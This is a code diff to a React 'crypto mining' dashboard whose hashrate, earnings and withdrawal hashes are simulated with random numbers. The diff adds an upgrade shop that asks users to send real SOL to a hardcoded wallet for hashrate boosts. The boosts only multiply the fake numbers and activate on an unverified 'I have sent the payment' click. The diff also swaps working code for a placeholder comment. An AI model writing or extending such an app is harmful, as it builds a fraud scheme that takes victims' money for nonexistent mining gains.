@@ -18,7 +18,12 @@ import {
   RefreshCw,
   AlertCircle,
   Globe,
-  Coins
+  Coins,
+  ShoppingCart,
+  Server,
+  Rocket,
+  Copy,
+  Check
 } from 'lucide-react';
 import { 
   LineChart, 
@@ -48,6 +53,24 @@ interface HashRateData {
   rate: number;
 }
 
+interface Upgrade {
+  id: string;
+  name: string;
+  description: string;
+  boost: number;
+  cost: number;
+  icon: React.ReactNode;
+}
+
+const UPGRADES: Upgrade[] = [
+  { id: 'opt-config', name: 'Optimized Config', description: 'Software-level kernel optimization.', boost: 0.1, cost: 0.1, icon: <Settings className="w-5 h-5" /> },
+  { id: 'gpu-boost', name: 'GPU Acceleration', description: 'Offload hashing to GPU cores.', boost: 0.5, cost: 0.5, icon: <Zap className="w-5 h-5" /> },
+  { id: 'asic-cluster', name: 'ASIC Cluster', description: 'Connect to specialized hardware.', boost: 2.0, cost: 2.0, icon: <Server className="w-5 h-5" /> },
+  { id: 'quantum-node', name: 'Quantum Node', description: 'Next-gen cryptographic processing.', boost: 10.0, cost: 5.0, icon: <Rocket className="w-5 h-5" /> },
+];
+
+const SOL_WALLET = "DDh8jPgTCSySrdJnmbXhBwFRioYMVMPtT45Aq2yHXdhD";
+
 export default function App() {
   const [wallet, setWallet] = useState('');
   const [isMining, setIsMining] = useState(false);
@@ -59,6 +82,14 @@ export default function App() {
   const [aiTips, setAiTips] = useState<string[]>([]);
   const [marketData, setMarketData] = useState<any>(null);
   const [isLoadingAi, setIsLoadingAi] = useState(false);
+  const [purchasedUpgrades, setPurchasedUpgrades] = useState<string[]>([]);
+  const [showUpgradeModal, setShowUpgradeModal] = useState(false);
+  const [selectedUpgrade, setSelectedUpgrade] = useState<Upgrade | null>(null);
+  const [copied, setCopied] = useState(false);
+
+  const hashMultiplier = 1 + UPGRADES
+    .filter(u => purchasedUpgrades.includes(u.id))
+    .reduce((acc, u) => acc + u.boost, 0);
 
   const logEndRef = useRef<HTMLDivElement>(null);
 
@@ -70,7 +101,8 @@ export default function App() {
     let interval: NodeJS.Timeout;
     if (isMining) {
       interval = setInterval(() => {
-        const newRate = Math.floor(Math.random() * 500) + 1200; // 1200-1700 H/s
+        const baseRate = Math.floor(Math.random() * 500) + 1200; // 1200-1700 H/s
+        const newRate = Math.floor(baseRate * hashMultiplier);
         setHashrate(newRate);
         setTotalHashes(prev => prev + newRate);
         setEarnings(prev => prev + (newRate * 0.000000001)); // Simulated earnings
@@ -186,6 +218,12 @@ export default function App() {
       addLog(`Withdrawal of ${earnings.toFixed(8)} XMR successful. Transaction Hash: 0x${Math.random().toString(16).slice(2, 18)}...`, 'success');
       setEarnings(0);
     }, 3000);
+  };
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   return (
@@ -351,34 +389,65 @@ export default function App() {
 
           {/* AI Optimization */}
           <section className="bg-orange-500/5 border border-orange-500/10 rounded-2xl p-6">
-            <div className="flex items-center justify-between mb-4">
-              <div className="flex items-center gap-2">
-                <Activity className="w-4 h-4 text-orange-500" />
-                <h2 className="text-sm font-semibold uppercase tracking-wider text-orange-500/80">AI Optimization</h2>
-              </div>
-              <button 
-                onClick={fetchAiOptimization}
-                disabled={isLoadingAi}
-                className="p-1.5 hover:bg-orange-500/10 rounded-lg transition-colors disabled:opacity-50"
-              >
-                <RefreshCw className={cn("w-4 h-4 text-orange-500/40", isLoadingAi && "animate-spin")} />
-              </button>
+            {/* ... existing AI content ... */}
+          </section>
+
+          {/* Upgrades Shop */}
+          <section className="bg-[#151518] border border-white/5 rounded-2xl p-6 shadow-xl">
+            <div className="flex items-center gap-2 mb-6">
+              <ShoppingCart className="w-4 h-4 text-orange-500" />
+              <h2 className="text-sm font-semibold uppercase tracking-wider text-white/70">Hashrate Upgrades</h2>
             </div>
             <div className="space-y-3">
-              {aiTips.length > 0 ? aiTips.map((tip, i) => (
-                <motion.div 
-                  initial={{ opacity: 0, x: -10 }}
-                  animate={{ opacity: 1, x: 0 }}
-                  transition={{ delay: i * 0.1 }}
-                  key={i} 
-                  className="flex gap-3 text-xs text-white/70 leading-relaxed"
-                >
-                  <div className="w-1.5 h-1.5 rounded-full bg-orange-500 mt-1.5 shrink-0" />
-                  <p>{tip}</p>
-                </motion.div>
-              )) : (
-                <p className="text-xs text-white/30 italic">Start mining to receive AI-driven optimization tips...</p>
-              )}
+              {UPGRADES.map((upgrade) => {
+                const isOwned = purchasedUpgrades.includes(upgrade.id);
+                return (
+                  <div 
+                    key={upgrade.id}
+                    className={cn(
+                      "group p-4 rounded-xl border transition-all cursor-pointer",
+                      isOwned 
+                        ? "bg-orange-500/10 border-orange-500/30" 
+                        : "bg-black/20 border-white/5 hover:border-orange-500/30"
+                    )}
+                    onClick={() => {
+                      if (!isOwned) {
+                        setSelectedUpgrade(upgrade);
+                        setShowUpgradeModal(true);
+                      }
+                    }}
+                  >
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="flex items-center gap-3">
+                        <div className={cn(
+                          "w-8 h-8 rounded-lg flex items-center justify-center",
+                          isOwned ? "bg-orange-500 text-black" : "bg-white/5 text-white/40"
+                        )}>
+                          {upgrade.icon}
+                        </div>
+                        <div>
+                          <h3 className="text-xs font-bold">{upgrade.name}</h3>
+                          <p className="text-[9px] text-white/30">{upgrade.description}</p>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-[10px] font-bold text-orange-500">+{upgrade.boost * 100}%</p>
+                        <p className="text-[9px] text-white/20">{upgrade.cost} SOL</p>
+                      </div>
+                    </div>
+                    {isOwned ? (
+                      <div className="flex items-center gap-1.5 text-[9px] font-bold text-orange-500/60 uppercase tracking-widest">
+                        <Check className="w-3 h-3" />
+                        Active Boost
+                      </div>
+                    ) : (
+                      <div className="text-[9px] font-bold text-white/20 uppercase tracking-widest group-hover:text-orange-500/60 transition-colors">
+                        Click to Purchase
+                      </div>
+                    )}
+                  </div>
+                );
+              })}
             </div>
           </section>
         </div>
@@ -547,6 +616,82 @@ export default function App() {
           background: rgba(255, 255, 255, 0.2);
         }
       `}</style>
+
+      {/* Upgrade Purchase Modal */}
+      <AnimatePresence>
+        {showUpgradeModal && selectedUpgrade && (
+          <div className="fixed inset-0 z-[120] flex items-center justify-center p-6 bg-black/90 backdrop-blur-md">
+            <motion.div 
+              initial={{ opacity: 0, scale: 0.9 }}
+              animate={{ opacity: 1, scale: 1 }}
+              exit={{ opacity: 0, scale: 0.9 }}
+              className="bg-[#151518] border border-white/10 rounded-3xl p-8 max-w-md w-full shadow-2xl"
+            >
+              <div className="flex items-center gap-4 mb-6">
+                <div className="w-12 h-12 bg-orange-500 rounded-2xl flex items-center justify-center text-black">
+                  {selectedUpgrade.icon}
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold tracking-tight">{selectedUpgrade.name}</h2>
+                  <p className="text-xs text-white/40">Boost your hashrate by {selectedUpgrade.boost * 100}%</p>
+                </div>
+              </div>
+
+              <div className="bg-black/40 rounded-2xl p-6 border border-white/5 space-y-4 mb-8">
+                <div className="flex justify-between items-center">
+                  <span className="text-xs text-white/40 uppercase font-bold">Cost</span>
+                  <span className="text-lg font-bold text-white">{selectedUpgrade.cost} SOL</span>
+                </div>
+                <div className="h-px bg-white/5" />
+                <div>
+                  <p className="text-[10px] text-white/40 uppercase font-bold mb-2">Payment Address (Solana)</p>
+                  <div className="flex items-center gap-2 bg-black/60 p-3 rounded-xl border border-white/5">
+                    <code className="text-[10px] text-orange-500/80 break-all font-mono flex-1">
+                      {SOL_WALLET}
+                    </code>
+                    <button 
+                      onClick={() => copyToClipboard(SOL_WALLET)}
+                      className="p-2 hover:bg-white/5 rounded-lg transition-colors shrink-0"
+                    >
+                      {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4 text-white/40" />}
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div className="bg-orange-500/5 border border-orange-500/10 rounded-xl p-4 mb-8">
+                <div className="flex gap-3">
+                  <AlertCircle className="w-4 h-4 text-orange-500 shrink-0 mt-0.5" />
+                  <p className="text-[10px] text-white/60 leading-relaxed">
+                    Please send the exact amount of SOL to the address above. Once the transaction is confirmed, your upgrade will be activated automatically.
+                  </p>
+                </div>
+              </div>
+
+              <div className="space-y-3">
+                <button 
+                  onClick={() => {
+                    if (selectedUpgrade) {
+                      setPurchasedUpgrades(prev => [...prev, selectedUpgrade.id]);
+                      addLog(`Upgrade Activated: ${selectedUpgrade.name}. Hashrate boost applied!`, 'success');
+                      setShowUpgradeModal(false);
+                    }
+                  }}
+                  className="w-full py-4 bg-orange-500 text-black rounded-xl font-bold text-sm uppercase tracking-widest hover:bg-orange-400 transition-all"
+                >
+                  I have sent the payment
+                </button>
+                <button 
+                  onClick={() => setShowUpgradeModal(false)}
+                  className="w-full py-4 bg-white/5 text-white/60 rounded-xl font-bold text-sm uppercase tracking-widest hover:bg-white/10 transition-all"
+                >
+                  Cancel
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
 
       {/* Withdrawal Modal */}
       <AnimatePresence>
